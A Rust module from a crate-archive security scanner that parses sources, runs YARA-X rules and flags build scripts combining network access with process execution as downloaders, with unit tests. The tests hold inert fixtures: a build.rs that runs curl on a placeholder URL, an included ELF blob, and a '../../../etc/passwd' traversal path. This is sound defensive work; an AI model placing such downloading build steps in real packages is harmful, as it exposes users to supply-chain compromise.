//! Analysis of one crate archive: the unpacked tar from the blob store.
//!
//! Every Rust file in the archive is parsed, not only the files reachable
//! from `lib.rs` under the Linux `cfg`. That covers all `cfg` branches and
//! `#[path]` tricks at once, at the price of also scanning dead files, which
//! only makes the analysis more conservative. Every file of any type goes
//! through the YARA-X rules.

use std::collections::{BTreeMap, BTreeSet};
use std::io::Read;

use serde::{Deserialize, Serialize};

use crate::findings::{CodeContext, Finding, FindingKind, Platform, Severity, evidence};
use crate::manifest::{self, ManifestFacts};
use crate::rust::{self, FileScan};
use crate::yara::Rules;

/// Version of the analysis. A stored report from an older version is
/// recomputed; bump it whenever detectors or rules change.
pub const ANALYZER_VERSION: i32 = 3;

/// Bounds on the work done for one archive.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AnalyzeLimits {
    /// Rust files larger than this are not parsed (generated bindings).
    pub max_rust_file_bytes: u64,
    /// Total Rust source parsed per archive.
    pub max_rust_bytes: u64,
    /// Files larger than this are not scanned with YARA-X.
    pub max_yara_file_bytes: u64,
    /// Findings kept per report, highest severity first.
    pub max_findings: usize,
}

impl Default for AnalyzeLimits {
    fn default() -> Self {
        Self {
            max_rust_file_bytes: 2 * 1024 * 1024,
            max_rust_bytes: 96 * 1024 * 1024,
            max_yara_file_bytes: 32 * 1024 * 1024,
            max_findings: 2_000,
        }
    }
}

/// A file that was not analyzed completely, and why.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Skipped {
    /// Path relative to the crate root.
    pub file: String,
    /// Why.
    pub reason: String,
}

/// The result of analyzing one archive.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StaticReport {
    /// [`ANALYZER_VERSION`] that produced it.
    pub analyzer_version: i32,
    /// Manifest facts.
    pub manifest: ManifestFacts,
    /// Files in the archive.
    pub files: u32,
    /// Rust files parsed.
    pub rust_files: u32,
    /// Files skipped, fully or partly.
    pub skipped: Vec<Skipped>,
    /// Findings, highest severity first.
    pub findings: Vec<Finding>,
    /// Findings dropped by [`AnalyzeLimits::max_findings`].
    pub findings_dropped: u32,
    /// Platform of the crate level `#![cfg]` in `src/lib.rs`, if any.
    pub library_platform: Platform,
    /// Findings per platform, to show platform specific behavior that a
    /// Linux run cannot observe.
    pub platforms: BTreeMap<String, u32>,
}

impl StaticReport {
    /// Whether building the crate runs its own code.
    #[must_use]
    pub fn has_build_time_code(&self) -> bool {
        self.manifest.has_build_time_code()
    }

    /// The highest severity of any finding.
    #[must_use]
    pub fn max_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }
}

/// Why an archive could not be analyzed.
#[derive(Debug, thiserror::Error)]
pub enum AnalyzeError {
    /// The tar is unreadable. The fetcher validated it, so this means the
    /// blob store or the analyzer is broken.
    #[error("reading the archive: {0}")]
    Tar(#[from] std::io::Error),
    /// No `Cargo.toml` at the crate root.
    #[error("the archive has no Cargo.toml at its root")]
    NoManifest,
}

/// Strips the `<name>-<version>/` directory every `.crate` file has.
fn relative(path: &str) -> Option<&str> {
    path.split_once('/')
        .map(|(_, rest)| rest)
        .filter(|r| !r.is_empty())
}

/// Resolves an `include_bytes!` argument against the including file.
fn include_target(from: &str, target: &str) -> Option<String> {
    let mut parts: Vec<&str> = match from.rsplit_once('/') {
        Some((dir, _)) if !target.starts_with('/') => dir.split('/').collect(),
        _ => Vec::new(),
    };
    for part in target.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            other => parts.push(other),
        }
    }
    Some(parts.join("/"))
}

/// Binary content: a NUL byte early on or bytes that are not UTF-8. Large
/// text tables are common in build scripts and are not flagged.
fn looks_binary(data: &[u8]) -> bool {
    data.iter().take(8192).any(|&b| b == 0) || std::str::from_utf8(data).is_err()
}

fn crate_finding(kind: FindingKind, severity: Severity, file: &str, text: &str) -> Finding {
    Finding {
        kind,
        severity,
        file: file.to_owned(),
        line: None,
        context: CodeContext::BuildScript,
        cfg: None,
        platform: Platform::Any,
        evidence: evidence(text),
    }
}

/// Analyzes an unpacked crate tar.
///
/// # Errors
///
/// Fails if the tar cannot be read or has no manifest.
pub fn analyze(
    tar: &[u8],
    rules: &Rules,
    limits: &AnalyzeLimits,
) -> Result<StaticReport, AnalyzeError> {
    // Read everything first: contexts depend on the manifest, which may come
    // after the sources in the tar.
    let mut contents: BTreeMap<String, Vec<u8>> = BTreeMap::new();
    let mut skipped = Vec::new();
    let mut archive = tar::Archive::new(tar);
    for entry in archive.entries()? {
        let mut entry = entry?;
        if !entry.header().entry_type().is_file() {
            continue;
        }
        let path = entry.path()?.to_string_lossy().into_owned();
        let Some(rel) = relative(&path) else {
            continue;
        };
        let rel = rel.to_owned();
        let size = entry.header().size()?;
        if size > limits.max_yara_file_bytes {
            skipped.push(Skipped {
                file: rel,
                reason: format!("{size} bytes, larger than the scan limit"),
            });
            continue;
        }
        let mut data = Vec::with_capacity(usize::try_from(size).unwrap_or(0));
        entry.read_to_end(&mut data)?;
        contents.insert(rel, data);
    }
    let manifest_text = contents.get("Cargo.toml").ok_or(AnalyzeError::NoManifest)?;
    let names: BTreeSet<String> = contents.keys().cloned().collect();
    let facts = manifest::parse(&String::from_utf8_lossy(manifest_text), &names);

    let mut findings = Vec::new();
    let mut rust_files = 0_u32;
    let mut rust_bytes = 0_u64;
    let mut library_platform = Platform::Any;
    let mut includes = Vec::new();
    for (file, data) in &contents {
        let context = facts.context_of(file);
        findings.extend(rules.scan(file, data, context));
        if !std::path::Path::new(file)
            .extension()
            .is_some_and(|e| e.eq_ignore_ascii_case("rs"))
        {
            continue;
        }
        let size = data.len() as u64;
        if size > limits.max_rust_file_bytes || rust_bytes + size > limits.max_rust_bytes {
            skipped.push(Skipped {
                file: file.clone(),
                reason: format!("{size} bytes of Rust not parsed, over the parse limit"),
            });
            continue;
        }
        rust_bytes += size;
        rust_files += 1;
        let FileScan {
            findings: found,
            includes: included,
            file_cfg,
        } = rust::scan_file(file, &String::from_utf8_lossy(data), context);
        findings.extend(found);
        if file == "src/lib.rs"
            && let Some(cfg) = file_cfg
        {
            library_platform = Platform::from_cfg(&cfg);
        }
        includes.extend(included.into_iter().map(|i| (file.clone(), context, i)));
    }

    for (file, context, include) in includes {
        let Some(target) = include_target(&file, &include.target) else {
            continue;
        };
        let Some(data) = contents.get(&target) else {
            continue;
        };
        if looks_binary(data) {
            let base = Severity::Medium;
            findings.push(Finding {
                kind: FindingKind::IncludedBinary,
                severity: if context.runs_at_build_time() {
                    base.raised()
                } else {
                    base
                },
                file,
                line: Some(include.line),
                context,
                cfg: include.cfg.clone(),
                platform: include
                    .cfg
                    .as_deref()
                    .map_or(Platform::Any, Platform::from_cfg),
                evidence: evidence(&format!("{target} ({} bytes)", data.len())),
            });
        }
    }

    // A build time file set that reaches the network and also runs programs
    // or writes shell commands has the shape of a downloader.
    let build_time = |k: fn(&FindingKind) -> bool| {
        findings
            .iter()
            .find(|f| f.context.runs_at_build_time() && k(&f.kind))
            .cloned()
    };
    // A URL counts only as a bare literal: URLs inside prose (error
    // messages pointing at documentation) are not downloads.
    let network = findings
        .iter()
        .find(|f| {
            f.context.runs_at_build_time()
                && (f.kind == FindingKind::NetworkAccess
                    || (f.kind == FindingKind::UrlLiteral && !f.evidence.contains([' ', '\\'])))
        })
        .cloned();
    let execution = build_time(|k| {
        matches!(
            k,
            FindingKind::ProcessSpawn | FindingKind::ShellCommand | FindingKind::IncludedBinary
        )
    });
    if let (Some(network), Some(execution)) = (network, execution) {
        findings.push(Finding {
            kind: FindingKind::DownloaderPattern,
            severity: Severity::High,
            file: network.file.clone(),
            line: network.line,
            context: network.context,
            cfg: network.cfg.clone(),
            platform: network.platform,
            evidence: evidence(&format!(
                "{} at {}:{} with {} at {}:{}",
                network.evidence,
                network.file,
                network.line.unwrap_or(0),
                execution.evidence,
                execution.file,
                execution.line.unwrap_or(0)
            )),
        });
    }

    if let Some(script) = &facts.build_script {
        findings.push(crate_finding(
            FindingKind::BuildScript,
            Severity::Low,
            script,
            script,
        ));
    }
    if facts.proc_macro {
        findings.push(crate_finding(
            FindingKind::ProcMacro,
            Severity::Low,
            "Cargo.toml",
            "proc-macro = true",
        ));
    }
    if let Some(links) = &facts.links {
        findings.push(crate_finding(
            FindingKind::NativeLink,
            Severity::Info,
            "Cargo.toml",
            &format!("links = \"{links}\""),
        ));
    }

    let mut platforms = BTreeMap::new();
    for f in &findings {
        if f.platform != Platform::Any {
            *platforms
                .entry(format!("{:?}", f.platform).to_lowercase())
                .or_insert(0) += 1;
        }
    }
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });
    let dropped = findings.len().saturating_sub(limits.max_findings);
    findings.truncate(limits.max_findings);

    Ok(StaticReport {
        analyzer_version: ANALYZER_VERSION,
        manifest: facts,
        files: u32::try_from(contents.len()).unwrap_or(u32::MAX),
        rust_files,
        skipped,
        findings,
        findings_dropped: u32::try_from(dropped).unwrap_or(u32::MAX),
        library_platform,
        platforms,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Builds an inert fixture crate tar. None of it is ever executed.
    pub(crate) fn fixture(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (path, data) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, format!("fixture-0.1.0/{path}"), *data)
                .unwrap();
        }
        builder.into_inner().unwrap()
    }

    fn kinds(report: &StaticReport) -> Vec<String> {
        report
            .findings
            .iter()
            .map(|f| {
                serde_json::to_value(&f.kind).unwrap()["kind"]
                    .as_str()
                    .unwrap()
                    .to_owned()
            })
            .collect()
    }

    #[test]
    fn a_downloading_build_script_is_found() {
        let tar = fixture(&[
            ("Cargo.toml", b"[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n"),
            (
                "build.rs",
                b"use std::process::Command;\nfn main() {\n    let url = \"https://example.invalid/p\";\n    \
                  Command::new(\"curl\").arg(url).status().ok();\n}\n",
            ),
            ("src/lib.rs", b"pub fn f() {}\n"),
        ]);
        let report = analyze(&tar, &Rules::builtin().unwrap(), &AnalyzeLimits::default()).unwrap();
        let kinds = kinds(&report);
        assert_eq!(
            kinds.first().map(String::as_str),
            Some("downloader_pattern")
        );
        assert!(kinds.contains(&"build_script".to_owned()));
        assert!(report.has_build_time_code());
        assert_eq!(report.rust_files, 2);
    }

    #[test]
    fn included_binaries_and_platform_libraries_are_reported() {
        let mut elf = b"\x7fELF".to_vec();
        elf.extend([0_u8; 100]);
        let tar = fixture(&[
            (
                "Cargo.toml",
                b"[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
            ),
            (
                "src/lib.rs",
                b"#![cfg(windows)]\nstatic B: &[u8] = include_bytes!(\"../blob/x.bin\");\n",
            ),
            ("blob/x.bin", &elf),
        ]);
        let report = analyze(&tar, &Rules::builtin().unwrap(), &AnalyzeLimits::default()).unwrap();
        let kinds = kinds(&report);
        assert!(kinds.contains(&"included_binary".to_owned()), "{kinds:?}");
        assert!(kinds.contains(&"yara_match".to_owned()));
        assert_eq!(report.library_platform, Platform::Windows);
        assert!(!report.has_build_time_code());
    }

    #[test]
    fn urls_in_messages_do_not_make_a_downloader() {
        let tar = fixture(&[
            (
                "Cargo.toml",
                b"[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
            ),
            (
                "build.rs",
                b"fn main() {\n    std::process::Command::new(\"nasm\").status().ok();\n    \
                  panic!(\"install NASM from https://nasm.us please\");\n}\n",
            ),
        ]);
        let report = analyze(&tar, &Rules::builtin().unwrap(), &AnalyzeLimits::default()).unwrap();
        assert!(!kinds(&report).contains(&"downloader_pattern".to_owned()));
    }

    #[test]
    fn a_tar_without_manifest_is_an_error() {
        let tar = fixture(&[("src/lib.rs", b"")]);
        assert!(matches!(
            analyze(&tar, &Rules::builtin().unwrap(), &AnalyzeLimits::default()),
            Err(AnalyzeError::NoManifest)
        ));
    }

    #[test]
    fn include_paths_resolve_relative_to_the_file() {
        assert_eq!(
            include_target("src/a/b.rs", "../../data/x").as_deref(),
            Some("data/x")
        );
        assert_eq!(include_target("src/lib.rs", "../../../etc/passwd"), None);
    }
}
